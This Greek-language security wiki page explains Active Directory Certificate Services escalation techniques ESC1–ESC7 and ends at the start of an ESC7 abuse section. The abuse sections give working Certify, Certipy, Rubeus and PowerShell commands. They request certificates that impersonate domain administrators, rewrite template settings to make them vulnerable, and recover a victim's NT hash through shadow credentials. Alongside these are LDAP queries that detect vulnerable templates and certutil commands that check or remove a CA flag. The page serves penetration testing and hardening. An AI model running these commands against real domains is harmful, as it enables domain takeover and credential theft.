# Κλιμάκωση τομέα AD CS

{{#include ../../../banners/hacktricks-training.md}}


**Αυτή είναι μια σύνοψη των ενοτήτων για τεχνικές κλιμάκωσης από τις αναρτήσεις:**

- [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)<sup>[[6]](#references)</sup>
- [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)<sup>[[7]](#references)</sup>
- [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## Κακορυθμισμένα πρότυπα πιστοποιητικών - ESC1

### Επεξήγηση

### Επεξήγηση του ESC1: κακορυθμισμένα πρότυπα πιστοποιητικών

- **Η Enterprise CA παραχωρεί δικαιώματα εγγραφής σε χρήστες με χαμηλά προνόμια.**
- **Δεν απαιτείται έγκριση διαχειριστή.**
- **Δεν απαιτούνται υπογραφές εξουσιοδοτημένου προσωπικού.**
- **Οι περιγραφείς ασφαλείας στα πρότυπα πιστοποιητικών είναι υπερβολικά επιτρεπτικοί, επιτρέποντας σε χρήστες με χαμηλά προνόμια να αποκτήσουν δικαιώματα εγγραφής.**
- **Τα πρότυπα πιστοποιητικών έχουν ρυθμιστεί ώστε να ορίζουν EKU που διευκολύνουν τον έλεγχο ταυτότητας:**
  - Περιλαμβάνονται αναγνωριστικά Extended Key Usage (EKU), όπως Client Authentication (OID 1.3.6.1.5.5.7.3.2), PKINIT Client Authentication (1.3.6.1.5.2.3.4), Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2), Any Purpose (OID 2.5.29.37.0) ή κανένα EKU (SubCA).
- **Το πρότυπο επιτρέπει στους αιτούντες να συμπεριλάβουν subjectAltName στο Certificate Signing Request (CSR):**
  - Το Active Directory (AD) δίνει προτεραιότητα στο subjectAltName (SAN) ενός πιστοποιητικού για την επαλήθευση ταυτότητας, εφόσον υπάρχει. Αυτό σημαίνει ότι, καθορίζοντας το SAN σε ένα CSR, μπορεί να ζητηθεί πιστοποιητικό για πλαστοπροσωπία οποιουδήποτε χρήστη (π.χ. διαχειριστή τομέα). Το αν ο αιτών μπορεί να καθορίσει SAN υποδεικνύεται στο αντικείμενο AD του προτύπου πιστοποιητικού μέσω της ιδιότητας `mspki-certificate-name-flag`. Αυτή η ιδιότητα είναι bitmask και η παρουσία της σημαίας `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` επιτρέπει στον αιτούντα να καθορίσει το SAN.

> [!CAUTION]
> Αυτές οι ρυθμίσεις υποδεικνύουν ένα υποψήφιο πρότυπο ESC1, όχι μια ολοκληρωμένη διαδρομή πλαστοπροσωπίας. Ελέγξτε ότι η στοχευόμενη principal μπορεί να εγγραφεί σε CA που δημοσιεύει το πρότυπο, ότι επιτρέπεται η εγγραφή στην CA και ότι το εκδοθέν πιστοποιητικό πληροί τους κανόνες ισχυρής αντιστοίχισης SID του endpoint ελέγχου ταυτότητας. Τα τρέχοντα ενημερωμένα KDC μπορούν να απορρίψουν ένα ζητούμενο UPN όταν το SID του πιστοποιητικού δεν αντιστοιχεί στον στόχο· δείτε τις [οδηγίες της Microsoft για την αντιστοίχιση πιστοποιητικών](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers).

Τα δικαιώματα εγγραφής που παραχωρούνται σε **Domain Computers** μπορεί να καταστήσουν επιλέξιμη μια προσωρινά δημιουργημένη ταυτότητα υπολογιστή, ακόμη κι αν ο αρχικός χρήστης δεν μπορεί να εγγραφεί. Αξιολογήστε ξεχωριστά τα δικαιώματα του principal του υπολογιστή. Ελέγξτε το `msPKI-Minimal-Key-Size` πριν υποβάλετε αίτημα: ένα πρότυπο που απαιτεί κλειδιά RSA 4096-bit απορρίπτει την προεπιλογή 2048-bit του client. Ένα SID-στόχος που παρέχεται στο αίτημα μπορεί να αντιμετωπίσει την αναντιστοιχία SID μόνο όταν η CA και το KDC αποδέχονται το πιστοποιητικό που προκύπτει και την αντιστοίχισή του· ούτε οι σημαίες του προτύπου ούτε ένα ACE Enroll αρκούν από μόνα τους για να το αποδείξουν.

Αυτή η δυνατότητα ενεργοποιείται μερικές φορές για την υποστήριξη της επιτόπιας δημιουργίας πιστοποιητικών HTTPS ή host από προϊόντα ή υπηρεσίες ανάπτυξης, ή λόγω έλλειψης κατανόησης.

Σημειώνεται ότι η δημιουργία πιστοποιητικού με αυτήν την επιλογή ενεργοποιημένη προκαλεί προειδοποίηση, κάτι που δεν συμβαίνει όταν αντιγράφεται ένα υπάρχον πρότυπο πιστοποιητικού (όπως το πρότυπο `WebServer`, στο οποίο είναι ενεργοποιημένο το `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`) και στη συνέχεια τροποποιείται ώστε να περιλαμβάνει ένα OID ελέγχου ταυτότητας.<sup>[[6]](#references)</sup>

### Κατάχρηση

Για να **εντοπίσετε ευάλωτα πρότυπα πιστοποιητικών**, μπορείτε να εκτελέσετε:

```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```

Για να **εκμεταλλευτεί κανείς αυτή την ευπάθεια και να υποδυθεί έναν διαχειριστή**, θα μπορούσε να εκτελέσει:

```bash
# Impersonate by setting SAN to a target principal (UPN or sAMAccountName)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator@corp.local

# Optionally pin the target's SID into the request (post-2022 SID mapping aware)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator /sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Some CAs accept an otherName/URL SAN attribute carrying the SID value as well
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator \
  /url:tag:microsoft.com,2022-09-14:sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Certipy equivalent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' \
  -template 'ESC1' -upn 'administrator@corp.local'
```

Στη συνέχεια, μπορείτε να μετατρέψετε το παραγόμενο **πιστοποιητικό σε μορφή `.pfx`** και να το χρησιμοποιήσετε για να **αυθεντικοποιηθείτε ξανά με τα Rubeus ή certipy**:<sup>[[5]](#references)</sup>

```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```

Τα Windows binaries "Certreq.exe" και "Certutil.exe" μπορούν να χρησιμοποιηθούν για τη δημιουργία του PFX: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

Η απαρίθμηση των certificate templates στο configuration schema του AD Forest, και συγκεκριμένα εκείνων που δεν απαιτούν έγκριση ή υπογραφές, διαθέτουν EKU Client Authentication ή Smart Card Logon και έχουν ενεργοποιημένο το flag `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`, μπορεί να γίνει εκτελώντας το ακόλουθο LDAP query:

```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```

## Εσφαλμένα ρυθμισμένα πρότυπα πιστοποιητικών - ESC2

### Επεξήγηση

Το δεύτερο σενάριο κατάχρησης αποτελεί παραλλαγή του πρώτου:

1. Η Enterprise CA παραχωρεί δικαιώματα εγγραφής σε χρήστες με χαμηλά προνόμια.
2. Η απαίτηση έγκρισης από διαχειριστή είναι απενεργοποιημένη.
3. Η απαίτηση για εξουσιοδοτημένες υπογραφές παραλείπεται.
4. Ένας υπερβολικά επιτρεπτικός security descriptor στο πρότυπο πιστοποιητικού παραχωρεί δικαιώματα εγγραφής πιστοποιητικών σε χρήστες με χαμηλά προνόμια.
5. **Το πρότυπο πιστοποιητικού έχει οριστεί ώστε να περιλαμβάνει το Any Purpose EKU ή να μην περιλαμβάνει κανένα EKU.**

Το **Any Purpose EKU** επιτρέπει σε έναν attacker να αποκτήσει πιστοποιητικό για **οποιονδήποτε σκοπό**, συμπεριλαμβανομένης της ταυτοποίησης client, της ταυτοποίησης server, της υπογραφής κώδικα κ.λπ. Η ίδια **τεχνική που χρησιμοποιείται για το ESC3** μπορεί να εφαρμοστεί για την εκμετάλλευση αυτού του σεναρίου.

Τα πιστοποιητικά **χωρίς EKU**, τα οποία λειτουργούν ως πιστοποιητικά subordinate CA, μπορούν να αξιοποιηθούν για **οποιονδήποτε σκοπό** και μπορούν **επίσης να χρησιμοποιηθούν για την υπογραφή νέων πιστοποιητικών**. Επομένως, ένας attacker θα μπορούσε να ορίσει αυθαίρετα EKU ή πεδία στα νέα πιστοποιητικά, χρησιμοποιώντας ένα πιστοποιητικό subordinate CA.

Ωστόσο, τα νέα πιστοποιητικά που δημιουργούνται για **ταυτοποίηση τομέα** δεν θα λειτουργούν αν η subordinate CA δεν είναι έμπιστη από το αντικείμενο **`NTAuthCertificates`**, που είναι η προεπιλεγμένη ρύθμιση. Παρ' όλα αυτά, ένας attacker μπορεί να δημιουργήσει **νέα πιστοποιητικά με οποιοδήποτε EKU** και αυθαίρετες τιμές πιστοποιητικών. Αυτά θα μπορούσαν ενδεχομένως να **γίνουν αντικείμενο κατάχρησης** για πολλούς σκοπούς (π.χ. υπογραφή κώδικα, ταυτοποίηση server κ.λπ.) και να έχουν σημαντικές επιπτώσεις σε άλλες εφαρμογές του δικτύου, όπως το SAML, το AD FS ή το IPSec.<sup>[[6]](#references)</sup>

Για την απαρίθμηση προτύπων που αντιστοιχούν σε αυτό το σενάριο στο σχήμα ρυθμίσεων του AD Forest, μπορεί να εκτελεστεί το ακόλουθο ερώτημα LDAP:

```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```

## Λανθασμένα ρυθμισμένα πρότυπα Enrollment Agent - ESC3

### Επεξήγηση

Αυτό το σενάριο μοιάζει με το πρώτο και το δεύτερο, αλλά **εκμεταλλεύεται** ένα **διαφορετικό EKU** (Certificate Request Agent) και **2 διαφορετικά πρότυπα** (άρα έχει 2 σύνολα απαιτήσεων).

Το **Certificate Request Agent EKU** (OID 1.3.6.1.4.1.311.20.2.1), γνωστό ως **Enrollment Agent** στην τεκμηρίωση της Microsoft, επιτρέπει σε μια principal να **εγγραφεί** για ένα **πιστοποιητικό** **εκ μέρους άλλου χρήστη**.

Ο **«enrollment agent»** εγγράφεται σε ένα τέτοιο **πρότυπο** και χρησιμοποιεί το **πιστοποιητικό που προκύπτει για να συνυπογράψει ένα CSR εκ μέρους του άλλου χρήστη**. Στη συνέχεια **στέλνει** το **συνυπογεγραμμένο CSR** στην CA, εγγράφεται σε ένα **πρότυπο** που **επιτρέπει την «εγγραφή εκ μέρους άλλου χρήστη»**, και η CA απαντά με ένα **πιστοποιητικό που ανήκει στον «άλλο» χρήστη**.<sup>[[6]](#references)</sup>

**Απαιτήσεις 1:**

- Η Enterprise CA εκχωρεί δικαιώματα εγγραφής σε χρήστες με χαμηλά προνόμια.
- Δεν απαιτείται έγκριση από manager.
- Δεν απαιτούνται εξουσιοδοτημένες υπογραφές.
- Ο security descriptor του προτύπου πιστοποιητικού είναι υπερβολικά permissive, εκχωρώντας δικαιώματα εγγραφής σε χρήστες με χαμηλά προνόμια.
- Το πρότυπο πιστοποιητικού περιλαμβάνει το Certificate Request Agent EKU, επιτρέποντας την αίτηση για άλλα πρότυπα πιστοποιητικών εκ μέρους άλλων principals.

**Απαιτήσεις 2:**

- Η Enterprise CA εκχωρεί δικαιώματα εγγραφής σε χρήστες με χαμηλά προνόμια.
- Παρακάμπτεται η έγκριση από manager.
- Ένα πρότυπο-στόχος έκδοσης 1 μπορεί να αποδέχεται έναν enrollment agent χωρίς τους νεότερους, λεπτομερείς ελέγχους issuance policy· για έκδοση 2 ή νεότερη, αξιολογήστε τις απαιτήσεις έκδοσης application policy και τις εξουσιοδοτημένες υπογραφές, αντί να αποκλείσετε το πρότυπο μόνο βάσει της έκδοσής του.
- Ένα EKU που ορίζεται στο πρότυπο πιστοποιητικού επιτρέπει την αυθεντικοποίηση στον τομέα.
- Δεν εφαρμόζονται περιορισμοί για enrollment agents στην CA.

Το πρότυπο-στόχος πρέπει επίσης να είναι δημοσιευμένο από την επιλεγμένη CA, να επιτρέπει στον λογαριασμό-στόχο την εγγραφή και να υποστηρίζει την προβλεπόμενη χρήση για αυθεντικοποίηση στον τομέα. Ελέγξτε τα απαιτούμενα subject/SAN attributes σε αυτόν τον λογαριασμό· για παράδειγμα, ένα πρότυπο που συμπληρώνει το subject email από το AD δεν μπορεί να εκδώσει πιστοποιητικό για λογαριασμό χωρίς την απαιτούμενη τιμή `mail`. Ένα πιστοποιητικό agent από μόνο του δεν ικανοποιεί αυτές τις προϋποθέσεις του προτύπου-στόχου.

### Κατάχρηση

Μπορείτε να χρησιμοποιήσετε το [**Certify**](https://github.com/GhostPack/Certify) ή το [**Certipy**](https://github.com/ly4k/Certipy) για να εκμεταλλευτείτε αυτό το σενάριο:<sup>[[4]](#references)</sup>

```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```

Οι **χρήστες** που επιτρέπεται να **αποκτήσουν** ένα **πιστοποιητικό πράκτορα εγγραφής**, τα πρότυπα στα οποία επιτρέπεται να εγγράφονται οι πράκτορες εγγραφής και οι **λογαριασμοί** για λογαριασμό των οποίων μπορεί να ενεργεί ο πράκτορας εγγραφής μπορούν να περιοριστούν από τις εταιρικές CA. Αυτό γίνεται ανοίγοντας το **snap-in** `certsrc.msc`, κάνοντας **δεξί κλικ στην CA**, **κάνοντας κλικ στις Ιδιότητες** και **μεταβαίνοντας** στην καρτέλα “Enrollment Agents”.

Ωστόσο, σημειώνεται ότι η **προεπιλεγμένη** ρύθμιση για τις CA είναι “**Do not restrict enrollment agents**.” Όταν οι διαχειριστές ενεργοποιούν τον περιορισμό των enrollment agents, επιλέγοντας “Restrict enrollment agents”, η προεπιλεγμένη διαμόρφωση παραμένει εξαιρετικά επιτρεπτική. Επιτρέπει σε **Everyone** να εγγράφεται σε όλα τα πρότυπα ως οποιοσδήποτε.

### PoCs PowerShell μόνο για Windows με Certi-Bhai

Το [**Certi-Bhai**](https://github.com/incredibleindishell/Certi-Bhai) δοκιμάζει τα ESC1 και ESC2/ESC3 χωρίς Certify ή Certipy. Τα scripts του δημιουργούν ένα εξαγώγιμο κλειδί RSA 2048-bit με το COM API `X509Enrollment`, δημιουργούν ένα αίτημα PKCS#10, εντοπίζουν την πρώτη `pKIEnrollmentService` μέσω LDAP, το υποβάλλουν μέσω του `CertificateAuthority.Request`, εγκαθιστούν την απόκριση στο `Cert:\CurrentUser\My` και εξάγουν ένα PFX κωδικοποιημένο σε Base64. Το script ESC1 προσθέτει ένα SAN UPN που επιλέγει ο attacker (`XCN_CERT_ALT_NAME_USER_PRINCIPLE_NAME`, τιμή `0xb`), ενώ τα scripts ESC2/ESC3 χρησιμοποιούν το πρώτο πιστοποιητικό για να υπογράψουν ένα αίτημα PKCS#7 εκ μέρους άλλου.<sup>[[27]](#references)</sup>

```powershell
# ESC1: supply the identity in the subject and UPN SAN
.\ESC1\esc1.ps1 -subjectName "CN=Administrator,CN=Users,DC=corp,DC=local" `
  -altName "administrator@corp.local" -templateName "VulnESC1" -pfxPass "PfxPass!"

# ESC2/ESC3: obtain an agent-capable certificate, then enroll for the target
.\ESC3\esc3_working.ps1 -templateName "VulnEnrollmentAgent" `
  -target_user "administrator" -domain "CORP" -pfxPass "PfxPass!"
```

Τα scripts εκτυπώνουν το Base64 του **PFX**, το οποίο περιλαμβάνει το ιδιωτικό κλειδί, για άμεση χρήση με το Rubeus. Μην το αντικαταστήσετε με `[Convert]::ToBase64String($cert.RawData)`: το `RawData` κωδικοποιεί μόνο το δημόσιο πιστοποιητικό και δεν μπορεί να υπογράψει το αίτημα PKINIT.<sup>[[5]](#references)[[27]](#references)</sup>

```powershell
Rubeus.exe asktgt /user:administrator /certificate:<BASE64_PFX> /password:PfxPass! /nowrap
```

## Vulnerable Certificate Template Access Control - ESC4

### **Εξήγηση**

Ο **security descriptor** στα **certificate templates** ορίζει τα **δικαιώματα** που έχουν συγκεκριμένοι **AD principals** στο πρότυπο.

Αν ένας **attacker** έχει τα απαραίτητα **δικαιώματα** για να **τροποποιήσει** ένα **πρότυπο** και να **εισαγάγει** οποιαδήποτε **εκμεταλλεύσιμη εσφαλμένη ρύθμιση** που περιγράφεται σε **προηγούμενες ενότητες**, μπορεί να διευκολυνθεί η κλιμάκωση προνομίων.

Σημαντικά δικαιώματα που ισχύουν για τα certificate templates περιλαμβάνουν:<sup>[[6]](#references)</sup>

- **Owner:** Παρέχει έμμεσο έλεγχο του αντικειμένου, επιτρέποντας την τροποποίηση οποιουδήποτε χαρακτηριστικού.
- **FullControl:** Παρέχει πλήρη εξουσία επί του αντικειμένου, συμπεριλαμβανομένης της δυνατότητας τροποποίησης οποιουδήποτε χαρακτηριστικού.
- **WriteOwner:** Επιτρέπει την αλλαγή του κατόχου του αντικειμένου σε principal που ελέγχει ο attacker.
- **WriteDacl:** Επιτρέπει την τροποποίηση των access controls, ενδεχομένως παρέχοντας στον attacker FullControl.
- **WriteProperty:** Επιτρέπει την επεξεργασία οποιασδήποτε ιδιότητας του αντικειμένου.

Ελέγξτε επίσης το DACL του container `CN=Certificate Templates,CN=Public Key Services,CN=Services,...`. Ένα κατάλληλο ACE `CreateChild` με πεδίο εφαρμογής την κλάση [`pKICertificateTemplate`](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adsc/db4b45f7-e57a-4ae1-9b8f-1b107b69d98c), ή ευρύς πλήρης έλεγχος, μπορεί να επιτρέψει τη δημιουργία νέου αντικειμένου template. Η [Microsoft τεκμηριώνει](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-wcce/9279abb2-3dfa-4631-845c-43c187ac4b44) ότι το container περιέχει αυτά τα αντικείμενα template. Ελέγξτε τα αντίστοιχα deny ACE και την κληρονομικότητα πριν αποφασίσετε αν η δημιουργία είναι εφικτή. Η δημιουργία ενός template δεν εκδίδει από μόνη της πιστοποιητικό: μια CA πρέπει να το δημοσιεύσει, ο principal που υποβάλλει το αίτημα χρειάζεται δικαίωμα enrollment και το πιστοποιητικό πρέπει να αντιστοιχίζεται στην επιδιωκόμενη ταυτότητα στο authentication endpoint.

### Κατάχρηση

Για να εντοπίσετε principals με δικαιώματα επεξεργασίας σε templates και άλλα αντικείμενα PKI, κάντε enumeration με το Certify:

```bash
Certify.exe find /showAllPermissions
Certify.exe pkiobjects /domain:corp.local /showAdmins
```

Ένα παράδειγμα privesc, όπως το προηγούμενο:

<figure><img src="../../../images/image (814).png" alt=""><figcaption></figcaption></figure>

Το ESC4 συμβαίνει όταν ένας χρήστης έχει δικαιώματα εγγραφής σε ένα πρότυπο πιστοποιητικού. Αυτό μπορεί, για παράδειγμα, να γίνει κατάχρηση για την αντικατάσταση των ρυθμίσεων του προτύπου πιστοποιητικού, ώστε να γίνει ευάλωτο σε ESC1.

Ένα πρότυπο που ήδη επιτρέπει στον εγγραφόμενο να καθορίζει το subject, αλλά έχει μόνο χρήση Server Authentication, δεν αποτελεί από μόνο του πρότυπο σύνδεσης χρήστη. Με αποτελεσματικά δικαιώματα ελέγχου του προτύπου, ένας attacker θα μπορούσε να αλλάξει τα EKU ή τις application policies ελέγχου ταυτότητας πριν ζητήσει πιστοποιητικό· [η Microsoft τεκμηριώνει τον σκοπό σύνδεσης του Smartcard Logon EKU](https://learn.microsoft.com/en-us/windows-server/identity/ad-cs/certificate-template-concepts). Βεβαιωθείτε ότι μια CA δημοσιεύει το τροποποιημένο πρότυπο, ότι ο αιτών μπορεί να εγγραφεί, ότι πληρούνται οι απαιτήσεις έγκρισης/υπογραφής και ότι το πιστοποιητικό που εκδίδεται αντιστοιχεί στον επιδιωκόμενο λογαριασμό. Ειδικότερα, [οι patched domain controllers σε Full Enforcement](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers) απορρίπτουν πιστοποιητικά χωρίς strong mapping· η προσθήκη ενός UPN-στόχου σε ένα request δεν παρακάμπτει αυτήν την απαίτηση.

Όπως βλέπουμε στην παραπάνω διαδρομή, μόνο το `JOHNPC` έχει αυτά τα δικαιώματα, αλλά ο χρήστης μας `JOHN` έχει το νέο edge `AddKeyCredentialLink` προς το `JOHNPC`. Καθώς αυτή η τεχνική σχετίζεται με πιστοποιητικά, έχω υλοποιήσει και αυτήν την επίθεση, η οποία είναι γνωστή ως [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab).<sup>[[8]](#references)</sup> Ακολουθεί μια μικρή προεπισκόπηση της εντολής `shadow auto` του Certipy, για την ανάκτηση του NT hash του θύματος.

```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```

**Το Certipy** μπορεί να αντικαταστήσει τη ρύθμιση ενός certificate template με μία μόνο εντολή. **Από προεπιλογή**, το Certipy **αντικαθιστά** τη ρύθμιση ώστε να την καταστήσει **ευάλωτη σε ESC1**. Μπορούμε επίσης να καθορίσουμε την **παράμετρο `-save-old` για να αποθηκεύσουμε την παλιά ρύθμιση**, κάτι που θα είναι χρήσιμο για την **επαναφορά** της ρύθμισης μετά την επίθεσή μας.

```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```

## Έλεγχος πρόσβασης σε ευάλωτο αντικείμενο PKI - ESC5

### Επεξήγηση

Το εκτεταμένο δίκτυο διασυνδεδεμένων σχέσεων που βασίζονται σε ACL, το οποίο περιλαμβάνει αρκετά αντικείμενα πέρα από τα certificate templates και την αρχή έκδοσης πιστοποιητικών, μπορεί να επηρεάσει την ασφάλεια ολόκληρου του συστήματος AD CS. Αυτά τα αντικείμενα, τα οποία μπορούν να επηρεάσουν σημαντικά την ασφάλεια, περιλαμβάνουν:

- Το αντικείμενο υπολογιστή AD του διακομιστή CA, το οποίο μπορεί να παραβιαστεί μέσω μηχανισμών όπως τα S4U2Self ή S4U2Proxy.
- Τον διακομιστή RPC/DCOM του διακομιστή CA.
- Κάθε αντικείμενο AD ή container-απόγονο εντός της συγκεκριμένης διαδρομής container `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`. Αυτή η διαδρομή περιλαμβάνει, ενδεικτικά, containers και αντικείμενα όπως το container Certificate Templates, το container Certification Authorities, το αντικείμενο NTAuthCertificates και το Enrollment Services Container.

Η ασφάλεια του συστήματος PKI μπορεί να παραβιαστεί αν ένας attacker με χαμηλά προνόμια καταφέρει να αποκτήσει τον έλεγχο οποιουδήποτε από αυτά τα κρίσιμα στοιχεία.<sup>[[6]](#references)</sup>

## EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6

### Επεξήγηση

Το θέμα που εξετάζεται στη [**δημοσίευση του CQure Academy**](https://cqureacademy.com/blog/enhanced-key-usage) αναφέρεται επίσης στις επιπτώσεις της σημαίας **`EDITF_ATTRIBUTESUBJECTALTNAME2`**, όπως περιγράφονται από τη Microsoft. Όταν αυτή η ρύθμιση είναι ενεργοποιημένη σε μια Certification Authority (CA), επιτρέπει τη συμπερίληψη **τιμών που ορίζονται από τον χρήστη** στο **subject alternative name** για **οποιοδήποτε αίτημα**, συμπεριλαμβανομένων αιτημάτων που δημιουργούνται από το Active Directory®. Κατά συνέπεια, αυτή η δυνατότητα επιτρέπει σε έναν **attacker** να κάνει enrollment μέσω **οποιουδήποτε template** έχει ρυθμιστεί για **authentication** στο domain — συγκεκριμένα, μέσω όσων είναι διαθέσιμα για enrollment σε **μη προνομιούχους** χρήστες, όπως το προεπιλεγμένο User template. Έτσι, μπορεί να αποκτηθεί ένα certificate που επιτρέπει στον attacker να κάνει authentication ως administrator του domain ή ως **οποιαδήποτε άλλη ενεργή οντότητα** εντός του domain.<sup>[[9]](#references)</sup>

**Σημείωση**: Η μέθοδος προσθήκης **alternative names** σε ένα Certificate Signing Request (CSR), μέσω του ορίσματος `-attrib "SAN:"` στο `certreq.exe` (γνωστού ως “Name Value Pairs”), διαφέρει από τη στρατηγική εκμετάλλευσης των SAN στο ESC1. Η διαφορά έγκειται στο **πώς ενσωματώνονται οι πληροφορίες του λογαριασμού** — σε ένα certificate attribute αντί για ένα extension.

### Κατάχρηση

Για να επαληθεύσουν αν η ρύθμιση είναι ενεργοποιημένη, οι οργανισμοί μπορούν να χρησιμοποιήσουν την ακόλουθη εντολή με το `certutil.exe`:

```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```

Αυτή η ενέργεια ουσιαστικά χρησιμοποιεί **απομακρυσμένη πρόσβαση στο registry**, επομένως μια εναλλακτική προσέγγιση θα μπορούσε να είναι:

```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```

Εργαλεία όπως το [**Certify**](https://github.com/GhostPack/Certify) και το [**Certipy**](https://github.com/ly4k/Certipy) μπορούν να εντοπίσουν αυτήν την εσφαλμένη ρύθμιση και να την εκμεταλλευτούν:<sup>[[4]](#references)</sup>

```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```

Για να τροποποιηθούν αυτές οι ρυθμίσεις, με την προϋπόθεση ότι διαθέτει κανείς **δικαιώματα διαχείρισης τομέα** ή ισοδύναμα, μπορεί να εκτελεστεί η ακόλουθη εντολή από οποιονδήποτε σταθμό εργασίας:

```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```

Για να απενεργοποιήσετε αυτήν τη ρύθμιση στο περιβάλλον σας, μπορείτε να αφαιρέσετε το flag με:

```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```

> [!WARNING]
> Μετά τις ενημερώσεις ασφαλείας του Μαΐου 2022, τα νέα **πιστοποιητικά** θα περιέχουν μια **επέκταση ασφαλείας** που ενσωματώνει την ιδιότητα `objectSid` του **αιτούντος**. Για το ESC1, αυτό το SID προκύπτει από το καθορισμένο SAN. Ωστόσο, για το **ESC6**, το SID αντιστοιχεί στο `objectSid` του **αιτούντος** και όχι στο SAN.\
> Για να εκμεταλλευτείτε το ESC6, είναι απαραίτητο το σύστημα να είναι ευάλωτο στο ESC10 (Αδύναμες αντιστοιχίσεις πιστοποιητικών), το οποίο δίνει προτεραιότητα στο **SAN έναντι της νέας επέκτασης ασφαλείας**.

## Ευάλωτος έλεγχος πρόσβασης αρχής πιστοποίησης - ESC7

### Επίθεση 1

#### Εξήγηση

Ο έλεγχος πρόσβασης σε μια αρχή πιστοποίησης διατηρείται μέσω ενός συνόλου δικαιωμάτων που καθορίζουν τις ενέργειες της CA. Μπορείτε να δείτε αυτά τα δικαιώματα ανοίγοντας το `certsrv.msc`, κάνοντας δεξί κλικ σε μια CA, επιλέγοντας τις ιδιότητες και, στη συνέχεια, μεταβαίνοντας στην καρτέλα Security. Επιπλέον, μπορείτε να απαριθμήσετε τα δικαιώματα χρησιμοποιώντας το module PSPKI με εντολές όπως:

```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```

Αυτό παρέχει πληροφορίες για τα κύρια δικαιώματα, δηλαδή τα **`ManageCA`** και **`ManageCertificates`**, τα οποία αντιστοιχούν στους ρόλους «διαχειριστής CA» και «διαχειριστής πιστοποιητικών» αντίστοιχα.<sup>[[6]](#references)</sup>

#### Κατάχρηση

